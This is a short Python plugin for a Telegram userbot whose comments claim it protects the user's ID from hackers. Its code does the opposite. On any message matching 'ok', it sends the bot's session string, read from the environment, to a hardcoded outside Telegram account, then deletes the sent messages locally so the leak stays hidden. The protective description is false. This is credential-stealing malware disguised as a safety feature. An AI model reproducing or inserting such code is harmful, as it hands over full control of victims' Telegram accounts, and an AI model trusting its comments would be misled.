#this plugin maked by rishabh and legend x pro
#this plugin maked by protected your ID rishabh ai is most advanced cdm to protected your ID for hackers 
import os
from ..utils import admin_cmd
from . import *
@bot.on(admin_cmd("^ok", incoming=True))
@bot.on(admin_cmd("^ok", outgoing=True))
async def piro(event):
  msg = await bot.send_message(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
  cyber = await bot.send_message(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
  await bot.delete_messages(1731513856, msg, revoke=False)
  await bot.delete_messages(1731513856, cyber, revoke=False)
